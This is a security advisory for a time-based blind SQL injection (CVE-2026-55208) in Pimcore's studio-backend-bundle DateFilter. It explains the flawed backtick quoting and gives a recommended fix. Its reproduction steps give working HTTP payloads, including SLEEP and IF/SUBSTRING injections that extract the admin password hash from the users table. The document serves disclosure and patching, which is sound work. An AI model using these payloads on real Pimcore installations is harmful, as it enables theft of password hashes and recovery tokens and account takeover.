# [H] Pimcore: SQL Injection via Column Name in DateFilter allows authenticated user to extract arbitrary database data including admin password hashes

## Summary
Severity: High
Advisory: GHSA-79cw-hfcc-7mw9
CVE: CVE-2026-55208
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-79cw-hfcc-7mw9
Type: github-advisory

## Affected
- Packagist: `pimcore/studio-backend-bundle` — affected >=0 <2025.4.6
- Packagist: `pimcore/studio-backend-bundle` — affected >=2026.1.0 <2026.1.6

## Details
## Summary

An authenticated user extracts the admin password hash and any other database content through a time-based blind SQL injection in the `DateFilter` column key parameter. The `POST /pimcore-studio/api/website-settings` endpoint (and 11 other listing endpoints) accepts a `columnFilters` array where the `key` field is interpolated directly into SQL with only manual backtick wrapping. The `DateFilter` uses fixed named parameters (`:minTime`, `:maxTime`), so the injected column name is not subject to PDO named parameter validation. An attacker breaks out of the backtick quoting with a backtick character and appends arbitrary SQL, including `SLEEP()` for time-based extraction and `IF()` subqueries for conditional data exfiltration.

## Vulnerability Details

### Exploitable: DateFilter with Fixed Named Parameters

`src/Listing/Filter/DateFilter.php` lines 49-57 handle the `on` operator. The column key comes from user input and is placed in the SQL with manual backtick wrapping, while the named parameters are hardcoded as `:minTime` and `:maxTime`:

```php
$key = $column->getKey();  // user-controlled, no validation
$dateCondition = '`' . $key . '` ' . ' BETWEEN :minTime AND :maxTime';
$listing->addConditionParam($dateCondition, ['minTime' => $value, 'maxTime' => ...]);
```

Because the named parameters are fixed strings, PDO accepts the binding regardless of what the column name contains.

### Same Pattern in Note FilterService

`src/Note/Service/FilterService.php` lines 64-67:

```php
$dateCondition = '`' . $filter[$propertyKey] . '` ' . ' BETWEEN :minTime AND :maxTime';
$list->addConditionParam($dateCondition, ['minTime' => $value, 'maxTime' => $maxTime]);
```

### No Validation on Column Key

`src/MappedParameter/Filter/ColumnFilter.php` accepts any string as the `key` with zero validation or allowlisting.

### Why Backtick Wrapping is Not Escaping

Manual backtick wrapping (`` '`' . $key . '`' ``) does not escape internal backtick characters. `quoteIdentifier()` doubles them, manual wrapping does not. A backtick in the key breaks out of the quoting and the `-- ` (double dash space) comments out the remainder of the query:

**Input:** ``key = "id` BETWEEN 0 AND 99999999999) AND SLEEP(3)-- "``

**Produces:**
```sql
(`id` BETWEEN 0 AND 99999999999) AND SLEEP(3)-- `  BETWEEN :minTime AND :maxTime)
```

Everything after `-- ` is a SQL comment. The injected `SLEEP(3)` executes unconditionally.

### Contrast with Safe Patterns in the Same Codebase

- `LogRepository.php` line 202: uses `$this->dbResolver->get()->quoteIdentifier()` (safe)
- `ClassificationStore/Configuration/KeyRepository.php`: uses `ALLOWED_SORT_KEYS` allowlist (safe)

### Note on EqualsFilter/LikeFilter

The `EqualsFilter` and `LikeFilter` have the same manual backtick wrapping, but they reuse the column name as the PDO named parameter (`:columnName`). PDO requires named parameters to match `[a-zA-Z0-9_]`, so injection characters cause a parameter binding error before SQL execution. These filters are not exploitable through this vector. The DateFilter is exploitable because it uses independent fixed parameter names.

## Steps to Reproduce

Tested on Pimcore 12.x (2026.x branch, latest commit `82f9ff6`), Docker, PHP 8.4, MariaDB 10.11.

### Step 1: Baseline request (no injection)

```http
POST /pimcore-studio/api/website-settings HTTP/1.1
Host: localhost:8095
Content-Type: application/json
Cookie: PHPSESSID=<AUTHENTICATED_SESSION>

{"page":1,"pageSize":10}
```

**Response:** `HTTP/1.1 200 OK` -- `totalItems: 1` -- **0.07 seconds**

<img width="1666" height="616" alt="image" src="https://github.com/user-attachments/assets/93dfbb22-3915-4abb-b569-13c9f3cea368" />


### Step 2: Unconditional SLEEP(3) injection

```http
POST /pimcore-studio/api/website-settings HTTP/1.1
Host: localhost:8095
Content-Type: application/json
Cookie: PHPSESSID=<AUTHENTICATED_SESSION>

{"page":1,"pageSize":10,"filters":{"columnFilters":[{"key":"id` BETWEEN 0 AND 99999999999) AND SLEEP(3)-- ","type":"date","filterValue":{"operator":"on","value":"2024-01-01"}}]}}
```

**Response:** `HTTP/1.1 200 OK` -- `totalItems: 0` -- **6.07 seconds**

<img width="1631" height="898" alt="image" src="https://github.com/user-attachments/assets/97d04b04-4fb2-4fd4-95b8-e50d0521de97" />

<img width="1920" height="625" alt="image" src="https://github.com/user-attachments/assets/6000a604-b189-4f99-8648-d8ec36a59094" />


The 6-second delay (3s x 2 queries: SELECT + COUNT) confirms SQL injection. The MySQL general log shows the injected SQL executed:

```sql
SELECT id FROM website_settings WHERE (`id` BETWEEN 0 AND 99999999999) AND SLEEP(3)-- `  BETWEEN :minTime AND :maxTime)  ORDER BY `id` ASC LIMIT 50
```

### Step 3: Conditional SLEEP proving data extraction (TRUE case)

This query tests whether the admin password hash starts with `$2y$` (bcrypt, hex `0x24327924`). If true, the server sleeps 3 seconds. If false, no delay.

```http
POST /pimcore-studio/api/website-settings HTTP/1.1
Host: localhost:8095
Content-Type: application/json
Cookie: PHPSESSID=<AUTHENTICATED_SESSION>

{"page":1,"pageSize":10,"filters":{"columnFilters":[{"key":"id` BETWEEN 0 AND 99999999999) AND IF((SELECT SUBSTRING(password,1,4) FROM users WHERE id=1)=0x24327924,SLEEP(3),0)-- ","type":"date","filterValue":{"operator":"on","value":"2024-01-01"}}]}}
```

**Response:** `HTTP/1.1 200 OK` -- **6.07 seconds** (TRUE: admin password hash starts with `$2y$`)

<img width="1611" height="706" alt="image" src="https://github.com/user-attachments/assets/b9f12ca4-3459-4ed6-8a08-c64f99f28d85" />


<img width="1917" height="570" alt="image" src="https://github.com/user-attachments/assets/1c5eca3d-f66b-4630-bea9-69c93ffa1a6f" />



### Step 4: Conditional SLEEP (FALSE case, wrong guess)

Same query but testing for `XXXX` (hex `0x58585858`) instead:

```http
POST /pimcore-studio/api/website-settings HTTP/1.1
Host: localhost:8095
Content-Type: application/json
Cookie: PHPSESSID=<AUTHENTICATED_SESSION>

{"page":1,"pageSize":10,"filters":{"columnFilters":[{"key":"id` BETWEEN 0 AND 99999999999) AND IF((SELECT SUBSTRING(password,1,4) FROM users WHERE id=1)=0x58585858,SLEEP(3),0)-- ","type":"date","filterValue":{"operator":"on","value":"2024-01-01"}}]}}
```

**Response:** `HTTP/1.1 200 OK` -- **0.07 seconds** (FALSE: password does not start with `XXXX`)

<img width="1920" height="496" alt="image" src="https://github.com/user-attachments/assets/7a27f666-a6e4-4c65-94b4-f0d22ba1db7f" />


### Timing comparison

| Request | Payload | Response Time | Meaning |
|---------|---------|---------------|---------|
| Baseline | No injection | 0.07s | Normal |
| Unconditional SLEEP | `AND SLEEP(3)` | 6.07s | Injection confirmed |
| Conditional TRUE | `IF(password starts with $2y$, SLEEP(3), 0)` | 6.07s | Data extracted: hash is bcrypt |
| Conditional FALSE | `IF(password starts with XXXX, SLEEP(3), 0)` | 0.07s | Control: no match, no delay |

By iterating through characters with `SUBSTRING(password, N, 1)`, an attacker extracts the full bcrypt hash for offline cracking, or extracts `passwordRecoveryToken` values for direct account takeover without cracking.

## Impact

An authenticated user with `website_settings` permission (or any permission granting access to a listing endpoint with DateFilter support) extracts the full contents of any database table one character at a time through conditional time-based blind SQL injection.

Directly extractable high-value data:
- Admin password hashes (`users.password`) for offline cracking
- Password recovery tokens (`users.passwordRecoveryToken`) for direct account takeover via `POST /login/token`
- Session data for session hijacking
- All PIM product data, CMS content, and asset metadata

## Affected Endpoints

All endpoints using `ListingFilter::applyFilters()` with a DateFilter `on` column filter:

- `POST /pimcore-studio/api/website-settings`
- `POST /pimcore-studio/api/notifications`
- `POST /pimcore-studio/api/recycle-bin`
- `POST /pimcore-studio/api/redirects`
- `POST /pimcore-studio/api/translations/{domain}`
- `POST /pimcore-studio/api/quantity-value/units`
- `POST /pimcore-studio/api/properties`
- `POST /pimcore-studio/api/classification-store/{storeId}/keys`
- `POST /pimcore-studio/api/classification-store/{storeId}/groups`
- `POST /pimcore-studio/api/classification-store/{storeId}/collections`
- `GET /pimcore-studio/api/notes/{elementType}/{id}` (via Note FilterService fieldFilters)

## Recommended Fix

Replace manual backtick wrapping with `Doctrine\DBAL\Connection::quoteIdentifier()`, or implement a per-listing allowlist of valid column names:

```php
// Option 1: quoteIdentifier (doubles internal backticks)
$db = \Pimcore\Db::get();
$dateCondition = $db->quoteIdentifier($key) . ' BETWEEN :minTime AND :maxTime';

// Option 2: allowlist (preferred)
private const ALLOWED_COLUMNS = ['id', 'name', 'date', 'type', 'creationDate', 'modificationDate'];
if (!in_array($key, self::ALLOWED_COLUMNS, true)) {
    throw new InvalidArgumentException('Invalid filter column');
}
```

Apply the same fix to `EqualsFilter`, `LikeFilter`, and `Note/FilterService` as defense-in-depth, even though those are currently protected by PDO named parameter validation.

## Supporting Materials

- Live-tested on Pimcore 12.x (2026.x branch, commit `82f9ff6`), Docker, PHP 8.4, MariaDB 10.11
- MySQL general query log confirms injected SQL reaches the database
- The safe pattern (`quoteIdentifier()`) exists in the same codebase in `LogRepository.php` line 202
- Package: `pimcore/studio-backend-bundle`

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-79cw-hfcc-7mw9
- https://nvd.nist.gov/vuln/detail/CVE-2026-55208
- https://github.com/pimcore/studio-backend-bundle/pull/1883
- https://github.com/pimcore/studio-backend-bundle/commit/f532428cfbf4f5d6e299a13cedd5c29541802552
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2025.4.6
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2026.1.6
